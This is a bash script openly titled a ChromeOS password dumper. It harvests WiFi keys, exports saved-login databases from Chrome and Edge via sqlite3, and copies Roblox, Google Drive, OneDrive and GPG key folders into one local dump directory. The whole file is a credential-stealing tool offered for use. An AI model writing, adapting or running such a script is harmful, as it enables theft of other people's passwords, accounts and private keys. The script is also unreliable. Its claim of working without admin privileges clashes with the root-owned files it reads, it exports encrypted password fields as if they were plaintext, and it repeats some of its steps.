#!/bin/bash
# Title: ChromeOS Password Dumper
# Version: 1.0
# Author: Austin Spraggins
# Description: Dumps any and all passwords on a ChromeOS laptop without requiring admin privileges

# Create a directory to store the dumped passwords
OUTPUT_DIR="$HOME/password_dump"
mkdir -p "$OUTPUT_DIR"

# Function to dump WiFi passwords
dump_wifi_passwords() {
    echo "Dumping WiFi passwords..."
    for FILE in /var/lib/NetworkManager/system-connections/*; do
        if [[ -f "$FILE" ]]; then
            SSID=$(grep "^ssid=" "$FILE" | awk -F'=' '{print $2}')
            PASSWORD=$(grep "^psk=" "$FILE" | awk -F'=' '{print $2}')
            if [[ -n "$SSID" && -n "$PASSWORD" ]]; then
                echo "SSID: $SSID, PASSWORD: $PASSWORD" >> "$OUTPUT_DIR/wifi_passwords.txt"
            fi
        fi
    done
}

# Function to dump browser passwords (Google Chrome)
dump_browser_passwords() {
    echo "Dumping browser passwords (Google Chrome)..."
    LOGIN_DATA="$HOME/.config/google-chrome/Default/Login Data"
    if [[ -f "$LOGIN_DATA" ]]; then
        cp "$LOGIN_DATA" "$OUTPUT_DIR/login_data_copy"
    sqlite3 "$OUTPUT_DIR/login_data_copy" <<EOF
.mode csv
.output $OUTPUT_DIR/chrome_passwords.csv
SELECT origin_url, username_value, password_value FROM logins;
EOF
        rm "$OUTPUT_DIR/login_data_copy"
    else
        echo "No Chrome login data found."
    fi
}

# Function to dump saved passwords from other applications
dump_other_passwords() {
    echo "Dumping passwords from other applications..."
    
    # Dump Roblox credentials
    echo "Dumping Roblox credentials..."
    if [ -d "$HOME/.config/Roblox" ]; then
        cp -r "$HOME/.config/Roblox" "$OUTPUT_DIR/roblox"
        echo "Roblox configurations copied to $OUTPUT_DIR/roblox"
    else
        echo "No Roblox configurations found."
    fi
    
    # Dump Google Chrome passwords
    echo "Dumping Google Chrome passwords..."
    LOGIN_DATA="$HOME/.config/google-chrome/Default/Login Data"
    if [ -f "$LOGIN_DATA" ]; then
        cp "$LOGIN_DATA" "$OUTPUT_DIR/chrome_login_data_copy"
        sqlite3 "$OUTPUT_DIR/chrome_login_data_copy" <<EOF
.mode csv
.output $OUTPUT_DIR/chrome_passwords.csv
SELECT origin_url, username_value, password_value FROM logins;
EOF
        rm "$OUTPUT_DIR/chrome_login_data_copy"
    else
        echo "No Chrome login data found."
    fi
    
    # Dump Microsoft Edge passwords (if installed)
    echo "Dumping Microsoft Edge passwords..."
    EDGE_LOGIN_DATA="$HOME/.config/microsoft-edge/Default/Login Data"
    if [ -f "$EDGE_LOGIN_DATA" ]; then
        cp "$EDGE_LOGIN_DATA" "$OUTPUT_DIR/edge_login_data_copy"
        sqlite3 "$OUTPUT_DIR/edge_login_data_copy" <<EOF
.mode csv
.output $OUTPUT_DIR/edge_passwords.csv
SELECT origin_url, username_value, password_value FROM logins;
EOF
        rm "$OUTPUT_DIR/edge_login_data_copy"
    else
        echo "No Edge login data found."
    fi
    
    # Dump Google Drive and Microsoft OneDrive credentials (if any)
    echo "Dumping Google Drive and Microsoft OneDrive credentials..."
    if [ -d "$HOME/.config/drive" ]; then
        cp -r "$HOME/.config/drive" "$OUTPUT_DIR/google_drive"
        echo "Google Drive configurations copied to $OUTPUT_DIR/google_drive"
    else
        echo "No Google Drive configurations found."
    fi
    
    if [ -d "$HOME/.config/onedrive" ]; then
        cp -r "$HOME/.config/onedrive" "$OUTPUT_DIR/onedrive"
        echo "OneDrive configurations copied to $OUTPUT_DIR/onedrive"
    else
        echo "No OneDrive configurations found."
    fi
    
    # Dump GPG keys
    echo "Dumping GPG keys..."
    if [ -d "$HOME/.gnupg" ]; then
        cp -r "$HOME/.gnupg" "$OUTPUT_DIR/gpg_keys"
        echo "GPG keys copied to $OUTPUT_DIR/gpg_keys"
    else
        echo "No GPG keys found."
    fi
    
    echo "Password dump from other applications completed."
}

# Main function to call all dump functions
main() {
    dump_wifi_passwords
    dump_browser_passwords
    dump_other_passwords
    
    echo "Password dump completed. All data saved to $OUTPUT_DIR."
}

# Create a directory to store the dumped passwords
OUTPUT_DIR="$HOME/password_dump"
mkdir -p "$OUTPUT_DIR"

# Execute the main function
main
